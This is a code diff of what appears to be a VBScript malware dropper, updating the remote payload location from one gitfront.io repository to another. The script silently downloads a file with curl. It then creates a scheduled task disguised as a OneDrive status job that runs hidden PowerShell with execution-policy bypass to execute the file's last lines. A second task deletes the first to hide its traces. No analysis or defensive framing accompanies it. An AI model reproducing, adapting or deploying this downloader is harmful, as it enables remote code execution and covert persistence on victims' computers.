@@ -1,6 +1,6 @@
 Set onetwo = WScript.CreateObject ("WScript.shell")
-onetwo.run "curl https://gitfront.io/r/thecollection/b48446b3038c43b055869efbbac684fe3f3e7dbc/themeeting/raw/courseone -o %USERPROFILE%\downloads\courseone.file", 0, False
+onetwo.run "curl https://gitfront.io/r/OCholding/f84dde778751c8c9a0403d4ea50f1a2ed9a405ee/test-project/raw/wegood -o %USERPROFILE%\downloads\wegood.file", 0, False
 wscript.sleep 12000
-onetwo.run "schtasks /create /sc minute /mo 5 /du 00:06 /k /tn 1DriveStatus /tr ""powershell -win hid -nop -exec bypass $anyfile = get-content $home\downloads\courseone.file | select-object -last 5; $scriptblock = [system.management.automation.scriptblock]::create($anyfile); & $scriptblock"" /F", 0, False
+onetwo.run "schtasks /create /sc minute /mo 5 /du 00:06 /k /tn 1DriveStatus /tr ""powershell -win hid -nop -exec bypass; set-location -path """$home"""; $anyfile = get-content ~\downloads\wegood.file | select-object -last 5; start-sleep -s 5; $scriptblock = [system.management.automation.scriptblock]::create($anyfile); & $scriptblock"" /F", 0, False
 wscript.sleep 10000
 onetwo.run "schtasks /create /sc minute /mo 7 /du 00:08 /k /tn 1DriveDel /tr ""schtasks /delete /tn 1DriveStatus /F"" /F", 0, False
